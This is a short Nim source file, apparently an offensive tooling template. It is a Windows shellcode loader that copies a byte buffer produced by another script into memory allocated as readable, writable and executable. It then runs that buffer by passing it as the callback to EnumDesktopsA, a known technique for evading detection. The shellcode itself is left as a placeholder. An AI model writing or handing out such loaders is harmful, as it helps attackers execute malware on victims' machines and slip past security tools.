import winim
import std/[strformat]

proc main() = 
  #[
    output of main.nim goes here
  ]#

  var p = VirtualAlloc(NULL, sizeof(buf).DWORD, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
  for i in buf.low .. buf.high:
    copyMem(p, addr buf[i], 1)
    p = cast[LPVOID](cast[int](p) + 1) 
  p = cast[LPVOID](cast[int](p) - buf.len) 
  EnumDesktopsA(GetProcessWindowStation(), cast[DESKTOPENUMPROCA](p), cast[LPARAM](NULL))


when isMainModule:
  main()